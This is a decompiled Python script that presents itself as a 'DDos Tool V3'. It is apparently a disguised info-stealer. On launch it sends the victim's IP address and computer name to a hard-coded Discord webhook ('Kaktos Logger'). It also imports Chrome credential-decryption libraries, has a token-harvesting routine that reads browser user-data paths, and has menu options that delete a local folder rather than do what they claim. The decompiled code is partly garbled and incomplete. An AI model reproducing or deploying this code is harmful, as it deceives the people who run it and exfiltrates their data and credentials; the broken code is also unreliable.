import os
import shutil
import sys
import time
import socket
import requests
import json
from colorama import Fore, Style, init
init(True, **('autoreset',))
os.system('title DDos Tool V3 ')
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    
    try:
        pass
    finally:
        return None
        return 'Error'



def getip():
    ip = 'None'
    
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    finally:
        return ip
        return ip



def gethwid():
    p = Popen('wmic csproduct get uuid', True, PIPE, PIPE, PIPE, **('shell', 'stdin', 'stdout', 'stderr'))
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
# WARNING: Decompyle incomplete

if __name__ == '__main__':
    get_token()
WEBHOOK_URL = 'https://discord.com/api/webhooks/1386742203144994867/o8xkQvKz7MLJoHojm0Ayl8104jNqGty1UwJ-fBSR__MvUYRRKoTiCUVSsegeAo3UxKRi'

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
        return None
    None(os.system)


def sl(text, delay, color = (0.05, Fore.WHITE)):
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print(Style.RESET_ALL)


def print_watermark():
    clear_screen()
    print(Fore.CYAN + "\n _   _ _                \n| | | (_)               \n| | | |_ _ __ _   _ ___ \n| | | | | '__| | | / __|\n\\ \\_/ / | |  | |_| \\__ \\\n \\___/|_|_|   \\__,_|___/\n                        \n    " + Style.RESET_ALL)


def get_public_ip():
    pass
# WARNING: Decompyle incomplete


def send_discord_log():
    ip_address = get_public_ip()
    computer_name = socket.gethostname()
    embed = {
        'username': 'Kaktos Logger',
        'embeds': [
            {
                'title': 'New Log!',
                'color': 16711680,
                'fields': [
                    {
                        'name': '1P',
                        'value': ip_address,
                        'inline': False },
                    {
                        'name': 'Computer Name',
                        'value': computer_name,
                        'inline': False }] }] }
    requests.post(WEBHOOK_URL, json.dumps(embed), {
        'Content-Type': 'application/json' }, **('data', 'headers'))


def find_target_folder():
    local_appdata = os.path.expanduser('~\\AppData\\Local')
    
    try:
        folders = os.listdir(local_appdata)
        for folder in folders:
            if 'DigitalEntitlements' in folder:
                pass
            return None
    finally:
        return None
        return None



def delete_folder():
    clear_screen()
    path = find_target_folder()
# WARNING: Decompyle incomplete


def credits():
    clear_screen()
    sl('\nDeveloped by: RealChris\n', Fore.MAGENTA, **('color',))
    time.sleep(3)
    clear_screen()


def main():
    send_discord_log()
    print_watermark()
    sl('1) DDos L4')
    sl('2) DDos L7')
    sl('3) Exit')
    choice = input('\n@DDos Tool : ')
    if choice == '1':
        clear_screen()
        delete_folder()
    elif choice == '2':
        clear_screen()
        credits()
    elif choice == '3':
        sl('Exiting...', Fore.RED, **('color',))
        return None
    sl('Invalid option. Please try again.\n', Fore.YELLOW, **('color',))
    continue

if __name__ == '__main__':
    main()
    return None

